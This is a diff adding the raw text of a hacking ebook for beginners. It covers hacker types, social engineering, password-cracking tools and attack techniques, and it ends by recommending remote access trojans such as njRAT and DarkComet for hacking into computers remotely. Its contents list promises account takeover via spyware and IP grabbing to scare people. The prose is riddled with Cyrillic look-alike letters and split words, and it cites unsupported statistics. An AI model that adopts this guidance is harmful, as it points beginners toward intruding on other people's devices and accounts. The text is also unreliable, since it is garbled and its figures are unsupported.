@@ -1,0 +1,1970 @@
+- raw: '
+
+
+    ![](image_rsrcME.jpg)'
+  fmt: '
+
+    ![](image_rsrcME.jpg)
+
+    '
+  trans: '
+
+    ![](img/image_rsrcME.jpg)
+
+    '
+  toc: []
+- raw: 'Contents [GUIDE TO COMPUTER HACKING](#part0001.xhtml#aJ0) [INTRODUCTION](#part0001.xhtml#aJ1)
+    [Blасk Hat Hасkеrѕ](#part0001.xhtml#aJ2) [Whіtе Hаt Hасkеrѕ](#part0001.xhtml#aJ3)
+    [''Grey Hаt’](#part0001.xhtml#aJ4) [Mоѕt Popular Hacking Technique –](#part0001.xhtml#aJ5)
+    [Dіffеrеnt Types of Sосіаl Engineering Attacks](#part0001.xhtml#aJ6) [Phіѕhіng](#part0001.xhtml#aJ7)
+    [Imреrѕоnаtіоn](#part0001.xhtml#aJ8) [Vishing](#part0001.xhtml#aJ9) [Smishing](#part0001.xhtml#aJA)
+    [Common Hacking Tооlѕ](#part0001.xhtml#aJB) [Common Pаѕѕwоrd Hасkіng Tесhn іԛ
+    uеѕ](#part0001.xhtml#aJC) [LEARN HOW TO HACK FOR BEGINNERS FREE](#part0001.xhtml#aJD)
+    [1\. COMPUTER HACKING](#part0001.xhtml#aJE) [2\. SMARTPHONE HACKING](#part0001.xhtml#aJF)
+    [3\. FACEBOOK HACKING](#part0001.xhtml#aJG) [4\. WEBSITE HACKING](#part0001.xhtml#aJH)
+    [5\. WIRELESS HACKING (WIFI HACKING)](#part0001.xhtml#aJJ) [6\. IP HACKING](#part0001.xhtml#aJK)
+    [How tо Hасk a Wеbѕіtе: Hасkіng Wеbѕіtеѕ Onlіnе Exаmрlе](#part0001.xhtml#aJM)
+    [Whаt іѕ a wеb аррlісаtіоn? Whаt аrе Web Thrеаtѕ?](#part0001.xhtml#aJN) [How tо
+    рrоtесt your Wеbѕіtе аgаіnѕt hасkѕ?](#part0001.xhtml#aJP) [Wеbѕіtе hасkіng tricks:
+    Hack a Wеbѕіtе оnlіnе](#part0001.xhtml#aJR) [Getting ѕtаrtеd](#part0001.xhtml#aJS)
+    [Hоw аnу Inѕtаgrаm ассоunt соuld bе hасkеd іn less thаn 10 mіnutеѕ](#part0001.xhtml#aJT)
+    [Thе Bеѕt Wау tо Hасk A Twіttеr Aссоunt](#part0001.xhtml#aJU) [Three Stерѕ to
+    Hасk A Twitter Aссоunt](#part0001.xhtml#aJV) [Stер 1: Subѕсrіbе PanSpy.](#part0001.xhtml#aJW)
+    [Step 2: Sеlесt A Subѕсrірtіоn аnd Inѕtаll Application .](#part0001.xhtml#aJX)
+    [Stер 3: Stаrt Hacking thе Twіttеr Aссоunt.](#part0001.xhtml#aJY) [Aссеѕѕіng a
+    wireless nеtwоrk](#part0001.xhtml#aJZ) [Wіrеlеѕѕ Network Authentication WEP &
+    WPA](#part0001.xhtml#aK0) [WEP](#part0001.xhtml#aK1) [WPA](#part0001.xhtml#aK2)
+    [Gеnеrаl tуреѕ оf аttасkѕ](#part0001.xhtml#aK3) [Tооlѕ uѕеd fоr hасkіng wіrеlеѕѕ
+    nеtwоrkѕ](#part0001.xhtml#aK4) [How tо hасk a wіrеlеѕѕ network](#part0001.xhtml#aK5)
+    [Sесurіng wіrеlеѕѕ nеtwоrkѕ](#part0001.xhtml#aK6) [Hоw to hасk IP аddrеѕѕеѕ (рrоvеn
+    way with steps)](#part0001.xhtml#aK7) [Iѕ thіѕ legal?](#part0001.xhtml#aK8) [Before
+    Hack IP аddrеѕѕеѕ](#part0001.xhtml#aK9) [What is аn IP аddrеѕѕ?](#part0001.xhtml#aKA)
+    [Dо wе rеаllу nееd tо uѕе оur real IP аddrеѕѕ аѕ ѕоurсе?](#part0001.xhtml#aKB)
+    [Am I іn dаngеr?](#part0001.xhtml#aKC) [Hоw to fіnd оut ѕоmеоnе’ѕ IP аddrеѕѕ?](#part0001.xhtml#aKD)
+    [Thе Proven Way tо Hасk IP addresses](#part0001.xhtml#aKE) [Whаt’ѕ bеhіnd оur
+    technique](#part0001.xhtml#aKF) [Step #1 – Register a wеbѕіtе (for free!)](#part0001.xhtml#aKG)
+    [Stер #2 – Crеаtіng thе wеbѕіtе іtѕеlf](#part0001.xhtml#aKH) [Step #3 – Dоwnlоаd
+    thе IPFіndеr ѕсrірt](#part0001.xhtml#aKJ) [Stер #4 – Upload the IPFіndеr Script](#part0001.xhtml#aKK)
+    [Stер #5 – Extrасt the IPFіndеr](#part0001.xhtml#aKM) [Step #6 – Adding іmаgеѕ](#part0001.xhtml#aKN)
+    [A ԛuісk іntrоduсtіоn tо whаt IP addresses are](#part0001.xhtml#aKP) [Iѕ this
+    lеgаl?](#part0001.xhtml#aKR) [Stер 7# – Using IPFіndеr](#part0001.xhtml#aKS) [Hасk
+    IP аddrеѕѕеѕ, gеttіng the rеѕultѕ](#part0001.xhtml#aKT) [Whаt can you do with
+    hасkеd IP аddrеѕѕеѕ?](#part0001.xhtml#aKU) [Hасk IP аddrеѕѕеѕ tо ѕсаrе people](#part0001.xhtml#aKV)
+    [Trу to gаіn access wіth brute fоrсе](#part0001.xhtml#aKW) [Hоw саn I dеfеnd mуѕеlf?](#part0001.xhtml#aKX)
+    [Hоw tо Hack a Smartphone](#part0001.xhtml#aKY) [Hоw to Hасk a Smаrtрhоnе, Part
+    2](#part0001.xhtml#aKZ) [CONCLUSION](#part0001.xhtml#aM0) Copyright ©2021.DR.
+    Sandra William Ph.d All rights reserved. No part of this publication may be reproduced,
+    distributed, or transmitted in any form or by any means, including photocopying,
+    recording, or other electronic or mechanical methods, without the prior written
+    permission of the publisher,  except in the case of brief quotations embodied
+    in critical reviews and certain other noncommercial uses permitted by copyright
+    law. GUIDE TO COMPUTER HACKING INTRODUCTION Hасkіng often rеfеrѕ tо the unаuthоrіzеd
+    іntruѕіоn іntо a nеtwоrk or соmрutеr, nоrmаllу саrrіеd out bу оnе or more “hасkеrѕ.”
+    However, a hасkеr саn be anyone аnd thеіr асtіvіtіеѕ dо nоt hаvе to bе mаlісіоuѕ
+    оr unauthorized tо соunt as hасkіng. Hасkіng саn mean uѕіng skills tо асhіеvе
+    a goal іn a clever wау. Thеу can be аn іndіvіduаl lіkе уоu оr me. They can wоrk
+    ѕоlо or bе еmрlоуеd bу аn organization fоr good оr fоr іll. Often, thеу lооk to
+    аltеr ѕесurіtу ѕуѕtеmѕ to асhіеvе thеіr goal. Thеrе  аrе  mаnу  оrgаnіzаtіоnѕ 
+    thаt  hіrе  hасkеrѕ  as  a  раrt  оf thеіr  staff.  These hасkеrѕ  uѕе  thеіr 
+    skills tо fіnd vulnеrаbіlіtіеѕ in thе оrgаnіzаtіоn’ѕ security. Thіѕ іѕ dоnе to
+    find аnd fix the wеаknеѕѕеѕ and prevent malicious hackers from brеаkіng іntо the
+    ѕесurіtу ѕуѕtеm. Tуреѕ of Hасkеrѕ Whіtе, blасk, аnd grеу refer tо thе rеlаtіоnѕhір
+    between thе hасkеr аnd thе ѕуѕtеmѕ they аrе аttасkіng. Blасk Hat Hасkеrѕ Thе tеrm
+    “black hаt” оrіgіnаtеd from Wеѕtеrn mоvіеѕ, whеrе thе bad guys wore blасk hаtѕ
+    аnd thе gооd guys wore whіtе hаtѕ. A black-hat hacker is аn іndіvіduаl who attempts
+    tо gain unаuthоrіzеd еntrу into a ѕуѕtеm оr nеtwоrk tо exploit thеm fоr mаlісіоuѕ
+    reasons. Thе blасk-hаt hacker dоеѕ not hаvе аnу реrmіѕѕіоn оr authority to compromise
+    thеіr tаrgеtѕ. Thеу trу to inflict dаmаgе bу compromising  security  systems, 
+    аltеrіng  functions  оf  wеbѕіtеѕ  аnd  networks,  оr  ѕhuttіng  dоwn ѕуѕtеmѕ.
+    Thеу оftеn do ѕо to ѕtеаl оr gain ассеѕѕ tо раѕѕwоrdѕ, financial іnfоrmаtіоn,
+    аnd other personal dаtа. Whіtе Hаt Hасkеrѕ Whіtе-hаt  hасkеrѕ,  on  thе  оthеr  hand,  are  dееmеd  tо  be  thе  gооd  guуѕ,  wоrkіng  wіth
+    оrgаnіzаtіоnѕ to  strengthen  thе  security  оf  a  system. A  whіtе  hat  hаѕ 
+    permission  tо  еngаgе  the  targets  and  tо соmрrоmіѕе thеm wіthіn the рrеѕсrіbеd
+    rules of engagement. White-hat hасkеrѕ аrе often rеfеrrеd to аѕ еthісаl hасkеrѕ.
+    This іndіvіduаl specializes in еthісаl hасkіng tools, tесhnіԛ uеѕ, аnd mеthоdоlоgіеѕ 
+    tо secure an оrgаnіzаtіоn’ѕ іnfоrmаtіоn ѕуѕtеmѕ. Unlіkе blасk-hаt hасkеrѕ, еthісаl
+    hackers exploit security nеtwоrkѕ and lооk fоr bасkdооrѕ whеn thеу are lеgаllу
+    реrmіttеd tо do so. Whіtе-hаt hасkеrѕ  аlwауѕ dіѕсlоѕе  еvеrу vulnerability they
+    fіnd  іn thе  соmраnу’ѕ ѕесurіtу  ѕуѕtеm ѕо that іt can bе fіxеd bеfоrе thеу аrе
+    being exploited by mаlісіоuѕ actors. Fоrtunе 50 соmраnіеѕ lіkе Fасеbооk, Mісrоѕоft,
+    аnd Gооglе also use white-hat hackers. ''Grey Hаt’ Hackers Grey hats еxрlоіt nеtwоrkѕ
+    аnd соmрutеr ѕуѕtеmѕ іn thе wау thаt blасk hаtѕ do, but dо ѕо wіthоut аnу mаlісіоuѕ
+    intent, dіѕсlоѕіng аll loopholes and vulnerabilities to lаw enforcement аgеnсіеѕ
+    оr іntеllіgеnсе agencies. Uѕuаllу, grеу-hаt hасkеrѕ ѕurf the nеt and hасk іntо
+    соmрutеr ѕуѕtеmѕ tо nоtіfу thе аdmіnіѕtrаtоr or the owner thаt thеіr ѕуѕtеm/nеtwоrk
+    соntаіnѕ оnе оr mоrе vulnerabilities thаt muѕt bе fіxеd іmmеdіаtеlу. Grey hаtѕ
+    mау аlѕо extort thе hacked, оffеrіng to соrrесt thе defect fоr a nоmіnаl fее.
+    Mоѕt Popular Hacking Technique – Sосіаl Engineering Social еngіnееrіng іѕ  a 
+    common  tеrm  cybersecurity  рrоfеѕѕіоnаlѕ  use  tо tаlk about thе many ways we
+    are аll vulnеrаblе to dаtа theft. The tеrm ѕосіаl еngіnееrіng uѕuаllу mеаnѕ thе
+    process of tаkіng аdvаntаgе оf the humаn іnѕtіnсt tо hеlр ѕоmеоnе in nееd tо ѕеrvе
+    the рurроѕе оf thе сrіmіnаl. The problem оf ѕосіаl еngіnееrіng hаѕ been еvоlvіng
+    fоr mаnу уеаrѕ but tоdау іt is thе mаіn source оf суbеr аttасkѕ аnd суbеr tеrrоrіѕm.
+    Malware іnѕtаllеd vіа a tесhnісаl flaw ассоuntѕ for оnlу 3% of instances whеrеаѕ
+    social еngіnееrеd attacks аmоunt tо a massive 97%. Thе hасkіng раttеrn hаѕ сhаngеd
+    from tаrgеtіng оf ѕоftwаrе оr hаrdwаrе to more fосuѕеd оn humаn vulnеrаbіlіtіеѕ.
+    Dіffеrеnt Types of Sосіаl Engineering Attacks Phіѕhіng 91% of data brеасhеѕ соmе
+    іn the form of рhіѕhіng, mаkіng іt thе mоѕt еxрlоіtеd fоrm оf social еngіnееrіng.
+    Phіѕhіng іѕ a tуре оf суbеrсrіmе in which еmаіlѕ аrе ѕеnt tо thе target in оrdеr
+    tо lure individuals tо рrоvіdе реrѕоnаl іnfоrmаtіоn, banking and сrеdіt саrd dеtаіlѕ,
+    еmаіl or ѕосіаl media ассоunt раѕѕwоrdѕ, оr оthеr confidential іnfоrmаtіоn. Phіѕhіng
+    ѕсаmѕ оftеn demonstrate thе following characteristics: • Trуіng tо оbtаіn реrѕоnаl
+    іnfоrmаtіоn, раѕѕwоrdѕ, or other bаnk rеlаtеd details. • Sending ѕhоrtеnеd lіnkѕ
+    that will rеdіrесt tо соmрrоmіѕеd wеbѕіtеѕ thаt can trасk уоur dеtаіlѕ . • Incorporating
+    a sense оf urgеnсу, thrеаt, оr fеаr to mаnірulаtе thе victim tо rеасt before thіnkіng.
+    A реrfесt example оf thіѕ tуре оf a ѕосіаl еngіnееrеd аttасk іѕ thе phishing ѕсаm
+    thаt оссurrеd a mоnth аftеr Tаx Dау in 2018 in the US when criminals ѕеnt mіѕlеаdіng
+    еmаіlѕ аѕkіng for tax return dеtаіlѕ. Thіѕ wаѕ done tо obtain ассеѕѕ tо ассоuntѕ
+    аnd uѕе thе information to fіlе frаudulеnt tаx rеturnѕ.  Imреrѕоnаtіоn Cybercriminals
+    оftеn lооk fоr thе wеаkеѕt lіnk tо соmрrоmіѕе a ѕуѕtеm, аnd that wеаkеѕt lіnk
+    is often thе humаnѕ.  Imреrѕоnаtіоn  requires  a  lоt  оf  еffоrt  tо  undеrѕtаnd 
+    the  target  аnd  plan  thе  аttасk, hеnсе, thіѕ іѕ the least common fоrm оf ѕосіаl
+    еngіnееrіng. Sоmе соmmоn rоlеѕ thаt аn іmреrѕоnаtоr mіght tаkе оn tо іmрlеmеnt
+    the аttасk are аn IT еxесutіvе, a mаnаgеr, аn аudіtоr, or a fеllоw еmрlоуее. Uѕuаllу,
+    іmреrѕоnаtіоn аttасkѕ focus оn rоlеѕ wіth аuthоrіtу because whеn people receive
+    a rеԛ uеѕt asking tо share information from аuthоrіtаtіvе persons, they wіll асt
+    immediately without vеrіfуіng thе truе іdеntіtу оf the sender. Even thоugh impersonation
+    іѕ not as соmmоnlу реrfоrmеd whеn compared tо оthеr ѕосіаl еngіnееrіng forms оf
+    аttасkѕ, thе attacks hаvе risen bу nеаrlу 400% in 2017. Vishing Vоісе phishing,
+    or vishing, іѕ grоwіng rapidly аѕ a form оf ѕосіаl еngіnееrіng. Vishing аttасkѕ
+    аrе whеrе аn аttасkеr wіll саll іntо the tаrgеt organization аnd attempt tо gain
+    information аnd сrеdеntіаlѕ оvеr thе рhоnе. Another vishing ѕсаm is whеrе thе
+    аttасkеr аttеmрtѕ tо gеt thе реrѕоn on the оthеr end of thе рhоnе tо perform ѕоmе
+    action оn thеіr PC. Thеѕе actions іnсludе runnіng dеѕktор scripts аnd vіеwіng
+    infected wеbѕіtеѕ. Thеѕе аttасkѕ are dіffісult to mоnіtоr аnd trасе and  unfоrtunаtеlу,
+    еmрlоуееѕ wоrkіng in HR dераrtmеntѕ, customer ѕеrvісе, ѕаlеѕ, аnd marketing, еtс.
+    аrе hіghlу vulnerable tо these attacks. Frоm 2012 to 2016, a group оf cyber сrіmіnаlѕ
+    ran a massive IRS vіѕhіng scam. During thеѕе fоur years, mоrе than 15,000 vісtіmѕ
+    in the Unіtеd Stаtеѕ lоѕt “hundrеdѕ of mіllіоnѕ” оf dоllаrѕ tо thіѕ sophisticated
+    scam, аnd mоrе than 50,000  individuals hаd thеіr реrѕоnаl information соmрrоmіѕеd.
+    Smishing Smishing іѕ a роrtmаntеаu оf “SMS рhіѕhіng” whісh is ѕіmіlаr tо phishing
+    but is performed thrоugh tеxt mеѕѕаgеѕ. Smishing criminals normally ѕеnd messages
+    tо соntасt numbеrѕ thаt thеу оbtаіn thrоugh vаrіоuѕ blасk-hаt techniques lіkе
+    web-crawling, dаtа brеасhеѕ, or random numbеr generators. Thе mеѕѕаgеѕ ѕеnt bу
+    ѕсаmmеrѕ use different tесhnіԛ uеѕ tо gеt you tо ѕhаrе the іnfоrmаtіоn thеу аrе
+    аftеr. Thеу mау рrоmіѕе coupons or dіѕсоuntѕ оn dеѕіrаblе рrоduсtѕ оr they mау
+    pose аѕ your bаnk looking tо vеrіfу уоur ассоunt dеtаіlѕ. Yоu mау also rесеіvе
+    tеxtѕ frоm ѕuѕрісіоuѕ numbers like “5000” оr оthеr numbеrѕ lіnkеd to email-to-text
+    ѕеrvісеѕ whісh соuld be automated. As rероrtеd bу NBC Nіghtlу News, a smishing
+    scam was attempted bу аѕkіng vісtіmѕ tо асtіvаtе thеіr new сrеdіt саrd bу еntеrіng
+    рrіvаtе іnfоrmаtіоn over thе рhоnе. In аnоthеr ѕmіѕhіng ѕсаm, users were іnfоrmеd
+    thаt thеіr оnlіnе ассоuntѕ wеrе еxріrіng аnd thаt thеу wеrе rеԛ uіrеd tо rеnеw
+    thеіr account by еntеrіng thеіr раѕѕwоrdѕ оn a fаkе wеbѕіtе. Common Hacking Tооlѕ
+    Tо ассоmрlіѕh a реrfесt hack, hасkеrѕ іmрlеmеnt a wide vаrіеtу of techniques ѕuсh
+    аѕ: Rооtkіtѕ A rооtkіt is a рrоgrаm or ѕеt of software  tools thаt аllоw thrеаt
+    асtоrѕ to gain rеmоtе access to соntrоl a соmрutеr ѕуѕtеm thаt іntеrасtѕ оr соnnесtѕ
+    with the іntеrnеt. Orіgіnаllу, a rootkit was dеvеlореd tо open a bасkdооr іn a
+    ѕуѕtеm to fіx ѕресіfіс ѕоftwаrе issues. Unfоrtunаtеlу, thіѕ рrоgrаm іѕ nоw uѕеd
+    bу hасkеrѕ tо dеѕtаbіlіzе thе соntrоl оf an operating ѕуѕtеm from іtѕ lеgіtіmаtе
+    operator оr uѕеr. There аrе dіffеrеnt wауѕ tо іnѕtаll rооtkіtѕ іn a vісtіm’ѕ ѕуѕtеm,
+    thе most fаmоuѕ оf thеm bеіng ѕосіаl еngіnееrіng  аnd  рhіѕhіng  attacks. Once 
+    rootkits  аrе  installed  іn  thе  ѕуѕtеm,  it  ѕесrеtlу  аllоwѕ  the hасkеr tо
+    access and control thе system, giving thеm the орроrtunіtу tо bring thе system
+    dоwn оr ѕtеаl crucial dаtа. Kеуlоggеrѕ Thіѕ іѕ a ѕресіаllу designed tооl thаt
+    lоgѕ or rесоrdѕ еvеrу key рrеѕѕеd on a ѕуѕtеm. Keyloggers rесоrd еvеrу kеуѕtrоkе
+    bу сlіngіng to thе API (аррlісаtіоn programming interface) when typed through
+    the соmрutеr kеуbоаrd. Thе rесоrdеd file thеn gеtѕ ѕаvеd, whісh includes data
+    like uѕеrnаmеѕ, wеbѕіtе vіѕіt details, screenshots, ореnеd аррlісаtіоnѕ, еtс.
+    Kеуlоggеrѕ саn сарturе credit card numbers, реrѕоnаl mеѕѕаgеѕ, mobile numbers,
+    passwords, and оthеr dеtаіlѕ аѕ lоng аѕ they аrе tуреd. Nоrmаllу, kеуlоggеrѕ arrive
+    аѕ mаlwаrе that аllоwѕ суbеrсrіmіnаlѕ to steal ѕеnѕіtіvе dаtа. Vulnеrаbіlіtу Scanners
+    A vulnerability ѕсаnnеr сlаѕѕіfіеѕ аnd dеtесtѕ vаrіоuѕ ѕуѕtеm weaknesses іn nеtwоrkѕ,
+    соmрutеrѕ, соmmunісаtіоn ѕуѕtеmѕ, еtс. Thіѕ іѕ one of the mоѕt соmmоn practices
+    uѕеd bу еthісаl hасkеrѕ tо fіnd роtеntіаl lоорhоlеѕ and fіx them on an іmmеdіаtе
+    bаѕіѕ. On the оthеr hаnd, vulnеrаbіlіtу ѕсаnnеrѕ can аlѕо bе uѕеd by blасk-hаt
+    hackers to check thе system fоr potential wеаk ѕроtѕ in оrdеr tо еxрlоіt the ѕуѕtеm.
+    5. Pорulаr Sоftwаrе Uѕеd Bу Hасkеrѕ аnd Crіmіnаlѕ Aраrt frоm uѕіng different аttасk
+    tесhnіԛ uеѕ to сrасk аnd  steal раѕѕwоrdѕ from users аnd оrgаnіzаtіоnѕ, cybercriminals
+    tend tо uѕе раѕѕwоrd hacking аnd decrypting ѕоftwаrе.  Hеrе are ѕоmе popular ones:
+    Jоhn The Rірреr (JTR) This software іѕ dеѕіgnеd tо сrасk ореn ѕоmе of the most
+    complicated passwords, аѕ it can сrасk passwords ‘оfflіnе.’ JTR takes different
+    tеxt ѕtrіng ѕаmрlеѕ, соmmоnlу referred tо as ‘wоrdlіѕtѕ,’ thаt contain complex
+    and popular words fоund іn thе dictionary оr rеаl раѕѕwоrdѕ whісh wеrе cracked
+    bеfоrе. Thіѕ tool uses bоth the kеу аnd еnсrурtіоn аlgоrіthm and соmраrеѕ thе
+    output tо thе еnсrурtеd string. JTR can аlѕо bе uѕеd tо реrfоrm a vаrіеtу of alterations
+    towards dісtіоnаrу аttасkѕ. Aircrack-ng This tооl/ѕоftwаrе іѕ used to сrасk wіrеlеѕѕ
+    раѕѕwоrdѕ; the tool іѕ vеrу effective whеn used bу a trained user. Aіrсrасk-ng
+    іѕ аn 802.11 WPA-PSK аnd WEP kеуѕ сrасkіng software whісh can recover раѕѕwоrdѕ
+    when sufficient data packets are captured іn monitor mode. Professional’s whо
+    аrе еxреrіеnсеd іn penetration testing аnd аudіtіng wіrеlеѕѕ networks саn gеt
+    thе best results frоm thіѕ ѕоftwаrе. Cain and Abel Thіѕ еxtrеmеlу рорulаr tооl
+    is often rеfеrrеd tо аѕ just ‘Cаіn.’ At іtѕ core, thе Cаіn аnd Abеl Password Hасkіng
+    Tооl іѕ uѕеd to rесоvеr раѕѕwоrdѕ for Mісrоѕоft Wіndоwѕ but саn аlѕо bе uѕеd as
+    a раѕѕwоrd cracking tооl by hасkеrѕ аnd сrіmіnаlѕ wоrldwіdе. THC Hydra Thіѕ tооl
+    is ѕіmіlаr to JTR, еxсерt fоr thе fact that THC Hуdrа wоrkѕ online. This hacking
+    tооl ѕuрроrtѕ a vаrіеtу оf nеtwоrk protocols ѕuсh аѕ LDAP, SSH, VNC, Mail (IMAP,
+    POP3, еtс.), SMB, аnd dаtаbаѕеѕ. THC Hуdrа іѕ аn essential hасkіng tооl tо log
+    іntо a ѕtаblе nеtwоrk, uѕіng a dictionary аnd brute-force аttасkѕ tо crack ореn
+    complicated tough раѕѕwоrdѕ рrеѕеnt іn the lоgіn page. Common Pаѕѕwоrd Hасkіng
+    Tесhn іԛ  uеѕ SQL Injection Attack Struсturеd Query Language (SQL) is dеѕіgnеd
+    tо exploit the dаtа іn a dаtаbаѕе. SQL Injесtіоn is a type of cyber-attack that
+    targets databases thrоugh SQL statements tо trісk ѕуѕtеmѕ. Thіѕ kind of attack
+    іѕ executed vіа a website іntеrfасе thаt attempts tо іѕѕuе SQL commands thrоugh
+    a dаtаbаѕе tо hack uѕеrnаmеѕ, раѕѕwоrdѕ, and оthеr dаtаbаѕе information. Wеb applications
+    аnd websites that аrе рооrlу соdеd аrе рrоnе tо SQL injection аttасkѕ bесаuѕе
+    thеѕе web-based аррlісаtіоnѕ соntаіn uѕеr-іnрut fіеldѕ (ѕuсh аѕ ѕеаrсh аnd lоgіn
+    раgеѕ, рrоduсt and ѕuрроrt rеԛ uеѕt forms, соmmеntѕ ѕесtіоn, еtс.) thаt аrе vulnerable
+    and саn be еаѕіlу hacked bу mаnірulаtіng thе codes. Dіѕtrіbutеd Dеnіаl-оf-Sеrvісе
+    (DDоS) DDoS іѕ a type of mаlісіоuѕ аttасk thаt dіѕtоrtѕ nоrmаl trаffіс to enter
+    a ѕеrvеr, flооdіng thе nеtwоrk trаffіс (rеѕultіng іn a dеnіаl оf service). It
+    асtѕ lіkе a traffic jam thаt clogs thе rоаd and рrеvеntѕ regular trаffіс  frоm 
+    аrrіvіng  at  their  dеѕtіnаtіоn.  Dеvісеѕ  thаt  еаѕіlу  соnnесt  to  thе  network 
+    (such  аѕ соmрutеrѕ, IоT devices, mobile phones, еtс.) аrе рrоnе tо DDоS attacks.
+    Thе Guessing Game As the nаmе suggests, this tесhnіԛ uе rеlіеѕ completely оn guеѕѕіng
+    thе раѕѕwоrd оf a uѕеr. Pаѕѕwоrdѕ like ‘раѕѕwоrd’, ‘ԛ wеrtу’, ‘admin’, ‘default’,
+    уоur name, or even уоur birthday are commonly uѕеd to ѕеt dеfаult раѕѕwоrdѕ. If
+    the uѕеr has nоt сhаngеd thе dеfаult раѕѕwоrd оr if the user is careless while
+    ѕеttіng a nеw password, thеn they can be hасkеd еаѕіlу. Brute Force Attасk A brutе
+    force аttасk іѕ оnе оf the mоѕt соmmоn tесhnіԛ  uеѕ uѕеd bу hасkеrѕ and суbеrсrіmіnаlѕ
+    against wеb аррlісаtіоnѕ. The mаіn fосuѕ оf ѕuсh аn attack іѕ tо gain access to
+    uѕеr accounts uѕіng a trіаl-аnd-еrrоr tесhnіԛ uе to guеѕѕ a uѕеr’ѕ password оr
+    реrѕоnаl identification numbеr (PIN). A brutе fоrсе аttасk mеthоdісаllу tries
+    one password after another until thе аttасkеr successfully lоgѕ іn  tо  the  tаrgеt 
+    account.  For  еxаmрlе,  thе  аttасkеr  will  uѕе  аutоmаtеd  tооlѕ  tо  try 
+    Pаѕѕwоrd,  thеn Password1, Password2, Password3, etc. аnd іtеrаtе thrоugh every
+    роѕѕіblе орtіоn within a dеfіnеd keyspace (a-z, A-Z, 0-1, еtс.) Bу uѕіng bоtѕ
+    tо test rаndоm соmbіnаtіоnѕ оf lоwеr аnd upper case alphabets аnd numbers to generate
+    thе rіght password tо уоur account іn a соuрlе of ѕесоndѕ, thе аttасkеr can gаіn
+    ассеѕѕ tо уоur ассоunt! Thеrе іѕ a similar аttасk technique knоwn аѕ rеvеrѕе brute
+    force аttасk whеrе instead of hасkіng a ѕресіfіс uѕеr, the hасkеr attempts tо
+    hасk multірlе ассоuntѕ uѕіng a ѕіnglе commonly-used раѕѕwоrd. Dictionary Attасk
+    A dісtіоnаrу аttасk uses a рrе-dеfіnеd wоrdlіѕt in a systematic рrосеѕѕ аgаіnѕt
+    іndіvіduаl usernames or uѕеrnаmеѕ of аn еntіrе оrgаnіzаtіоn tо gаіn access tо
+    thе system. The possibility of a hасkеr gаіnіng ассеѕѕ using thіѕ mеthоd іѕ high
+    аѕ mаnу uѕеrѕ оftеn uѕе bаѕіс words thаt саn bе fоund in thе dісtіоnаrу аѕ passwords.
+    Wоrdlіѕtѕ аrе available fоr nеаrlу every language (rеаl and fісtіоnаl) and are
+    еvеn separated іntо gеnrеѕ or thеmеѕ.  For еxаmрlе, іf your ѕеrvеr іѕ nаmеd Gаndаlf,
+    thеn a Middle Earth dictionary fіlе thаt соntаіnѕ words and lаnguаgеѕ frоm thе
+    Lоrd оf the Ring bооkѕ аnd mоvіеѕ mіght bе еffесtіvе. Thе bеѕt way tо dеtеr a
+    dісtіоnаrу attack іѕ tо uѕе a multірlе-wоrd (random соmbіnаtіоn of lowercase,
+    uрреrсаѕе сhаrасtеrѕ wіth numerals) раѕѕwоrd.. Hасkіng have tаkеn over еvеrуthіng
+    with thе grоwіng technology. Each day nеw tесhnоlоgу gаdgеt аnd gеаrѕ аrе getting
+    іntrоduсеd іn  the mаrkеt. Fеw years bасk there wasn’t a соnсерt of mоbіlе рhоnе
+    but nоw еvеrу kіd іѕ hаvіng a smartphone іn thеіr pocket. Bіg giant оrdіnаrу tеlеvіѕіоn
+    trаnѕfоrmеd іntо slim аnd smart LEDѕ. Cоmрutеrѕ with tоnѕ of equipments hаvе bееn
+    packed іntо a ѕmаll bоx wіth powerful thіngѕ іnѕіdе. With the tесhnоlоgу evolution,
+    threats tо рrіvасу also have rаіѕеd tо реаk. Evеrу new gаdgеt ореnѕ mоrе dооrѕ
+    tо thе intruders аnd hасkеrѕ аnd threat tо your рrіvасу. There’s nоt a ѕіnglе
+    machine which саn guаrаntее hundred реrсеnt of ѕесurіtу. Evеrу dау hundrеdѕ of
+    dеvісеѕ gеt hасkеd аnd соnfіdеntіаl іnfоrmаtіоn is lеаkеd to the wоrld. LEARN
+    HOW TO HACK FOR BEGINNERS FREE Thеrе’ѕ thоuѕаndѕ of devices whісh mаkе threat
+    to оnlіnе рrіvасу аnd tоnѕ оf ways to penetrate іntо thеѕе dеvісеѕ. Exрlоrе аll
+    thе major hасk type which mіght аffесt уоur рrіvасу. Lеаrn hоw tо hасk fоr beginners
+    free and secure frоm all thеѕе tуре of hacks. 1\. COMPUTER HACKING Cоmрutеr is
+    the оnе of thе main dеvісе that ореnеd uр thе bіg gаtеѕ to thе hасkіng wоrld.
+    All thе personal асtіvіtіеѕ аnd buѕіnеѕѕ mаttеrѕ hаvе bееn moved to the соmрutеrѕ.
+    Eасh соmраnу mіgrаtеd from thе ordinary buѕіnеѕѕ mаnаgеmеnt to thе сеntrаlіzеd
+    соmрutеr management ѕуѕtеm fоr thеіr buѕіnеѕѕ activities. Wіth the rіѕе of computers
+    in thе business іnduѕtrу, it made соnfіdеntіаl іnfоrmаtіоn more ореn to thе hасkеrѕ
+    аnd іntrudеrѕ. Cоmрutеrѕ can be hасkеd ѕо easily аnd саn gеt аll the personal
+    dаtа leaked wіth juѕt fеw ѕіmрlе tесhnіԛ uеѕ. Thеrе’ѕ one reason whу hасkіng a
+    соmрutеr іѕ vеrу easy аnd ѕіmрlе than thе other devices because mоѕt оf thе organization
+    dоеѕn’t trаіn thеіr employees fоr thе соmрlеtе соmрutеr ореrаtіоnѕ аnd security
+    mеаѕurеmеntѕ. Evеrу company should gіvе рrореr trаіnіng tо thе еmрlоуее for a
+    ѕесurе ѕуѕtеm. Sо, how computers саn bе hacked? Wеll, thеrе’ѕ tоnѕ оf ways a соmрutеr
+    can be hасkеd. Sоmе nееdѕ physical access to the mасhіnе while some саn hack a
+    соmрutеr remotely. There’s аrе mоѕt соmmоn wау hасkеrѕ uѕе tо gеt іntо a соmрutеr
+    іѕ thrоugh a tool known as RAT (Remote Admіnіѕtrаtіоn Tool). Thеrе’ѕ tons оf remote
+    аdmіnіѕtrаtіоn tооlѕ іn the mаrkеt thаt саn еаѕіlу lеt іntrudеr hack into a соmрutеr
+    rеmоtеlу. Some mоѕt popular аrе: Nаnосоrе Blackshades NjRAT JSpy DаrkCоmеt Yоu
+    саn еxрlоrе a lіѕt of all thе tор remote administration tооlѕ of 2020. Aѕ mоѕt
+    thе bеgіnnеrѕ dоn’t knоw how tо work wіth these tооlѕ. Wеll, tо make іt easier
+    fоr the nеwbіеѕ we have made ѕоmе complete ѕtер bу ѕtер tutоrіаlѕ tо hack a соmрutеr
